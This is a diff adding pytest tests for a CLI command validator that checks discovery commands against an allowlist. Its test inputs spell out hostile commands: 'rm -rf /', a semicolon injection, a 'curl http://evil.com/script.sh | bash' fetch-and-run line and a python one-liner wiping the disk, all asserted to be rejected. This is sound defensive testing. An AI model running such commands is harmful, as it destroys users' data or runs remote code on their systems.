@@ -2,7 +2,16 @@
 
 from unittest.mock import patch
 
-from emdx.commands.delegate import _slugify_title, _resolve_task, PR_INSTRUCTION
+import click
+import pytest
+
+from emdx.commands.delegate import (
+    _slugify_title,
+    _resolve_task,
+    _validate_discovery_command,
+    PR_INSTRUCTION,
+    SAFE_DISCOVERY_COMMANDS,
+)
 
 
 class TestSlugifyTitle:
@@ -90,3 +99,81 @@ class TestPRInstruction:
 
     def test_pr_instruction_mentions_pr_create(self):
         assert "gh pr create" in PR_INSTRUCTION
+
+
+class TestValidateDiscoveryCommand:
+    """Tests for _validate_discovery_command — security validation for --each."""
+
+    def test_allowed_commands_pass(self):
+        """Valid discovery commands should be accepted."""
+        for cmd in ["fd -e py", "find . -name '*.py'", "git ls-files", "ls -la"]:
+            result = _validate_discovery_command(cmd)
+            assert isinstance(result, list)
+            assert len(result) > 0
+
+    def test_fd_command_parsed_correctly(self):
+        """fd command should be parsed into arguments."""
+        result = _validate_discovery_command("fd -e py src/")
+        assert result == ["fd", "-e", "py", "src/"]
+
+    def test_find_command_parsed_correctly(self):
+        """find command should be parsed into arguments."""
+        result = _validate_discovery_command("find . -name '*.py'")
+        assert result == ["find", ".", "-name", "*.py"]
+
+    def test_git_ls_files_allowed(self):
+        """git ls-files should be allowed."""
+        result = _validate_discovery_command("git ls-files")
+        assert result == ["git", "ls-files"]
+
+    def test_full_path_to_allowed_command(self):
+        """Commands with full paths should work if basename is allowed."""
+        result = _validate_discovery_command("/usr/bin/fd -e py")
+        assert result[0] == "/usr/bin/fd"
+
+    def test_dangerous_command_rejected(self):
+        """Dangerous commands like rm should be rejected."""
+        with pytest.raises(click.exceptions.Exit):
+            _validate_discovery_command("rm -rf /")
+
+    def test_shell_injection_rejected(self):
+        """Shell injection attempts should be rejected."""
+        with pytest.raises(click.exceptions.Exit):
+            _validate_discovery_command("; rm -rf ~")
+
+    def test_pipe_injection_rejected(self):
+        """Pipe injection should be rejected (entire string is parsed, not shell-expanded)."""
+        # With shlex.split and no shell=True, this becomes ["fd", "|", "xargs", "rm"]
+        # The base command "fd" is allowed, but the "|" is just a literal argument
+        result = _validate_discovery_command("fd | xargs rm")
+        # The command is parsed literally - the pipe is just an argument
+        assert result == ["fd", "|", "xargs", "rm"]
+        # This is safe because shell=False means no pipe interpretation
+
+    def test_arbitrary_command_rejected(self):
+        """Arbitrary executables should be rejected."""
+        with pytest.raises(click.exceptions.Exit):
+            _validate_discovery_command("curl http://evil.com/script.sh | bash")
+
+    def test_python_command_rejected(self):
+        """Python interpreter should be rejected."""
+        with pytest.raises(click.exceptions.Exit):
+            _validate_discovery_command("python -c 'import os; os.system(\"rm -rf /\")'")
+
+    def test_empty_command_rejected(self):
+        """Empty commands should be rejected."""
+        with pytest.raises(click.exceptions.Exit):
+            _validate_discovery_command("")
+
+    def test_safe_commands_constant_exists(self):
+        """SAFE_DISCOVERY_COMMANDS should include expected safe commands."""
+        assert "fd" in SAFE_DISCOVERY_COMMANDS
+        assert "find" in SAFE_DISCOVERY_COMMANDS
+        assert "git" in SAFE_DISCOVERY_COMMANDS
+        assert "rg" in SAFE_DISCOVERY_COMMANDS
+        # Dangerous commands should NOT be in the allowlist
+        assert "rm" not in SAFE_DISCOVERY_COMMANDS
+        assert "curl" not in SAFE_DISCOVERY_COMMANDS
+        assert "bash" not in SAFE_DISCOVERY_COMMANDS
+        assert "python" not in SAFE_DISCOVERY_COMMANDS
+
